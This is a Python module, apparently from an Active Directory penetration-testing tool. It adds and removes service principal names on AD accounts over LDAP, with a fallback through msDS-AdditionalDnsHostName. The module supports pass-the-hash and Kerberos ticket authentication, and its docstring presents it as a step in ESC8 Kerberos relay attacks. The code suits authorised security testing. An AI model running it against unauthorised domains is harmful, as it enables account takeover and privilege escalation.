"""AD servicePrincipalName write primitives.

Adds or removes SPNs on AD accounts via LDAP modify on the
servicePrincipalName attribute. Reusable for:
  - ESC8 Kerberos relay (register http/relay-host SPN on CA machine account)
  - RBCD setup (future)
  - Any workflow needing SPN manipulation

Uses ADscanLDAPConnection (LDAPS→LDAP fallback).
"""

from __future__ import annotations

import asyncio
import contextlib
from dataclasses import dataclass
from typing import Any, AsyncIterator

from adscan_core import telemetry
from adscan_internal.rich_output import (
    mark_sensitive,
    print_error,
    print_info_debug,
    print_success,
    print_warning,
)
from adscan_internal.services.ldap_transport_service import (
    ADscanLDAPConfig,
    ADscanLDAPConnection,
)
from adscan_core.rich_output import print_exception


@dataclass(frozen=True)
class ADSPNConfig:
    """Connection config for SPN write operations.

    Supports the full execution-credential surface required in hardened
    AD environments: cleartext ``password``, an NT hash (pass-the-hash),
    a Kerberos ccache, or Kerberos with cross-realm overrides. All auth
    fields are optional so existing password-only callers behave identically.

    Auth-mode fields:
        password: Cleartext password (the legacy default).
        nt_hash: NT hash for pass-the-hash. Threaded into the transport's
            ``password`` slot, which detects the hash format and emits the
            correct ``ntlm-nt`` / ``kerberos-rc4`` URL scheme (see
            ``ADscanLDAPConfig.__post_init__``).
        ccache_path: Explicit Kerberos ccache file path. Implies Kerberos.
        use_kerberos: Force Kerberos authentication (AES-only / NTLM-disabled
            domains). Defaults to ``False`` for backward compatibility; the
            transport upgrades to Kerberos automatically when ``ccache_path``
            is set.
        auth_domain: Credential's home domain for cross-realm scenarios
            (the user lives in a different domain than the target).
        auth_kdc: KDC IP for the credential's home domain (cross-realm).
        posture_snapshot: Optional posture snapshot so the auth planner can
            prune impossible auth combinations on the first try.
    """

    dc_ip: str
    domain: str
    username: str
    password: str | None = None
    nt_hash: str | None = None
    ccache_path: str | None = None
    auth_domain: str | None = None
    auth_kdc: str | None = None
    use_kerberos: bool = False
    posture_snapshot: Any = None


def _ldap_cfg(config: ADSPNConfig) -> ADscanLDAPConfig:
    """Build an ``ADscanLDAPConfig`` covering every supported auth mode.

    Pass-the-hash works by placing the NT hash in the transport's
    ``password`` slot — ``ADscanLDAPConfig.__post_init__`` documents this as
    the canonical PtH path (there is intentionally no separate ``nt_hash``
    field). When ``ccache_path`` is set the bind authenticates from the
    ticket, so no secret is threaded as ``password``. ``use_ldaps=True`` is
    kept so the transparent LDAPS→LDAP fallback in ``ADscanLDAPConnection``
    always applies. The Kerberos target hostname is normalized by
    ``__post_init__`` — passing ``dc_ip`` through is safe.
    """
    # Single secret resolution: ccache > nt_hash (PtH) > cleartext password.
    if config.ccache_path:
        secret: str | None = None
    elif config.nt_hash:
        secret = config.nt_hash
    else:
        secret = config.password

    use_kerberos = bool(config.use_kerberos or config.ccache_path)

    return ADscanLDAPConfig(
        domain=config.domain,
        dc_ip=config.dc_ip,
        use_ldaps=True,
        use_kerberos=use_kerberos,
        username=config.username,
        password=secret,
        ccache_path=config.ccache_path,
        auth_domain=config.auth_domain,
        auth_kdc=config.auth_kdc,
        posture_snapshot=config.posture_snapshot,
    )


def _resolve_account_dn(config: ADSPNConfig, samaccountname: str) -> str | None:
    """Return the DN for a sAMAccountName. Raises on connection failure."""
    with ADscanLDAPConnection(_ldap_cfg(config)) as conn:
        conn.search(
            search_base=conn.domain_dn,
            search_filter=f"(sAMAccountName={samaccountname})",
            attributes=["distinguishedName", "servicePrincipalName"],
        )
        if not conn.entries:
            return None
        return str(conn.entries[0].dn)


def _modify_spn_sync(
    config: ADSPNConfig,
    spn: str,
    target_samname: str,
    add: bool,
) -> tuple[bool, str | None]:
    """Add or remove an SPN on target_samname. Returns (ok, error).

    Strategy (in order):
    1. Direct write to servicePrincipalName (requires GenericWrite / WriteSPN).
    2. Fallback: write the hostname portion to msDS-AdditionalDnsHostName
       (requires Validated Write — available to more principals).
       When this attribute is populated, AD auto-registers the corresponding SPNs.
    """
    try:
        with ADscanLDAPConnection(_ldap_cfg(config)) as conn:
            conn.search(
                search_base=conn.domain_dn,
                search_filter=f"(sAMAccountName={target_samname})",
                attributes=["distinguishedName", "servicePrincipalName"],
            )
            if not conn.entries:
                return False, f"account {target_samname!r} not found in LDAP"
            target_dn = str(conn.entries[0].dn)
            op = "add" if add else "delete"

            # Attempt 1: direct servicePrincipalName write
            ok = conn.modify(target_dn, {"servicePrincipalName": [(op, [spn])]})
            if ok:
                action = "added" if add else "removed"
                print_info_debug(
                    f"ADSPN: {action} SPN {spn!r} on {target_samname!r} "
                    f"(via servicePrincipalName)"
                )
                return True, None

            # Attempt 2: msDS-AdditionalDnsHostName (Validated Write)
            # Strip the service class prefix (e.g. "http/host.domain" → "host.domain")
            hostname_part = spn.split("/", 1)[1] if "/" in spn else spn
            ok2 = conn.modify(
                target_dn,
                {"msDS-AdditionalDnsHostName": [(op, [hostname_part])]},
            )
            if ok2:
                action = "added" if add else "removed"
                print_info_debug(
                    f"ADSPN: {action} hostname {hostname_part!r} on {target_samname!r} "
                    f"(via msDS-AdditionalDnsHostName — SPNs auto-registered)"
                )
                return True, None

            return False, f"LDAP modify failed for {target_dn} (tried servicePrincipalName + msDS-AdditionalDnsHostName)"
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return False, str(exc)


async def adspn_add(config: ADSPNConfig, spn: str, target_samname: str) -> bool:
    ok, err = await asyncio.to_thread(_modify_spn_sync, config, spn, target_samname, True)
    if not ok:
        print_error(f"ADSPN: failed to add SPN {spn!r} on {target_samname!r}: {err}")
    return ok


async def adspn_remove(config: ADSPNConfig, spn: str, target_samname: str) -> bool:
    ok, err = await asyncio.to_thread(_modify_spn_sync, config, spn, target_samname, False)
    if not ok:
        print_warning(
            f"ADSPN: failed to remove SPN {spn!r} from {target_samname!r} — "
            f"manual cleanup required: {err}"
        )
    return ok


@contextlib.asynccontextmanager
async def adspn_scope(
    config: ADSPNConfig,
    spn: str,
    target_samname: str,
) -> AsyncIterator[str]:
    """RAII context: add SPN on enter, remove on exit (even on exception)."""
    added = await adspn_add(config, spn, target_samname)
    if not added:
        raise RuntimeError(
            f"ADSPN: could not add SPN {spn!r} on {target_samname!r} — "
            "check write permissions (GenericWrite / WriteSPN on the account)"
        )
    print_success(
        f"ADSPN: registered SPN {mark_sensitive(spn, 'text')} "
        f"on {mark_sensitive(target_samname, 'user')}"
    )
    try:
        yield spn
    finally:
        removed = await adspn_remove(config, spn, target_samname)
        if removed:
            print_success(
                f"ADSPN: removed SPN {mark_sensitive(spn, 'text')} "
                f"from {mark_sensitive(target_samname, 'user')}"
            )
        else:
            print_warning(
                f"ADSPN: could not remove SPN {spn!r} from {target_samname!r} — "
                f"manual cleanup: modify servicePrincipalName on account DN"
            )
